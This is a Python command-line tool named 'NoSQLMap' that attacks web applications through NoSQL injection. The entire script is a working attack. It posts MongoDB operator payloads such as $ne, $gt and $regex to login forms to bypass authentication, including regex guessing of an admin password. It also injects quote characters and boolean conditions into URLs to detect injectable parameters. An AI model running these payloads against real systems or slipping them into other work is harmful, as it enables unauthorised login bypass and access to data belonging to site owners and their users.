#!/usr/bin/env python3
import requests
import argparse
import re
import json

def exploit(target, forms, json_forms):
    url_chars = [
        "'", "\"", "", "{",
        ";", "$Foo", "}",
        "$Foo", "\\xYZ"
    ]

    json_payloads = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}},
        {"username": {"$gt": None}, "password": {"$gt": None}},
        {"username": {"$gt":""}, "password": {"$gt":""}},
        {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }},
        {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }},
        {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }},
        {"username": {"$ne": ""}, "password": {"$regex": "^p" }},
        {"username": {"$regex": "admin.*"}, "password": {"$ne": None}}
    ]

    error_messages = ["Command failed", "Unexpected error", "Uncaught exception", "MongoError", "SyntaxError"]

    if json_forms:
        user_input = None
        for payload in json_payloads:
            response = requests.post(target, json=payload)

            if "Your username is" in response.text or "Welcome" in response.text or response.status_code == 302:
                if user_input is None:
                    user_input = input(f"[\033[32m+\033[0m] The login form appears to be vulnerable. Do you want to continue?[y/N] ")
                    if user_input != "y":
                        exit(1)
                print(f"[\033[32m+\033[0m] Login bypassed with -> \033[34m{payload}\033[0m")

    else:
        for char in url_chars:
            response = requests.get(target + char)

            if any(error in response.text for error in error_messages):
                print(f"[\033[32m+\033[0m] The {char} character appears to work.")

                if not input(f"[\033[32m+\033[0m] Do you want to proceed?[y/N] ") == "y":
                    exit(1)

                payloads = [
                    f"{char}%00",
                    f"{char}+%26%26+0+%26%26+{char}",
                    f"{char}+%26%26+1+%26%26+{char}",
                    f"{char}+||+1+||+{char}"
                ]

                for payload in payloads:
                    response = requests.get(target + payload)
                    if not any(error in response.text for error in error_messages):
                        print(f"[\033[32m+\033[0m] Boolean condition trigged with -> \033[34m{payload}\033[0m")

def main(target, forms, json_forms):
    if not re.match("^https://?", target):
        target = f"https://{target}"

    exploit(target, forms, json_forms)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="NoSQLMap")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--json_forms", action="store_true")
    parser.add_argument("--forms", action="store_true")
    args = parser.parse_args()

    print(r"""
        _   __     _____ ____    __    __  ___
       / | / /___ / ___// __ \  / /   /  |/  /___ _____
      /  |/ / __ \\__ \/ / / / / /   / /|_/ / __ / __ \
     / /|  / /_/ /__/ / /_/ / / /___/ /  / / /_/ / /_/ /
    /_/ |_/\____/____/\___\_\/_____/_/  /_/\__,_/ .___/
                                               /_/
                                             by: Katashi
""")

    try:
        main(args.target, args.forms, args.json_forms)
    except EOFError:
        exit(1)
    except KeyboardInterrupt:
        exit(1)
